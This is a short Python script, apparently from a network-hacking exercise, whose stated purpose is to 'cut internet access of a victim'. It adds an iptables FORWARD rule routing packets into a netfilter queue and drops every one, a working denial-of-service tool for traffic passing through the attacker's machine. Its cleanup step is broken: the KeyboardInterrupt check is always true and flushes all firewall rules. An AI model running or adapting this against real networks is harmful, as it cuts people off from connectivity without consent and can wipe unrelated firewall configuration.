#!/usr/bin/env python3

# Author: Nikhil Sharma
# Created Date: 11-06-2020
# Last Updated: 13-06-2020
# Operating System: Linux and Mac
# Description: A program to cut internet access of a victim

# Import the necessary libraries
import netfilterqueue
import subprocess

# Create a queue to trap the incoming packets (forwarded packets)
subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)


# Define the callback funtion
def process_packet(packet):
	print(packet)
	# drop the packet -> cuts off the internet connection of the victim
	packet.drop()


# Create a queue to trap the packets
queue = netfilterqueue.NetfilterQueue()
# Bind the queue to the created queue (that is currently storing the packets)
queue.bind(0, process_packet)
# Run the queue
queue.run()

# Delete the iptables created at the started 
if KeyboardInterrupt:
	print("[+] Deleting created iptables............Please Wait!")
	subprocess.call("iptables --flush", shell=True)
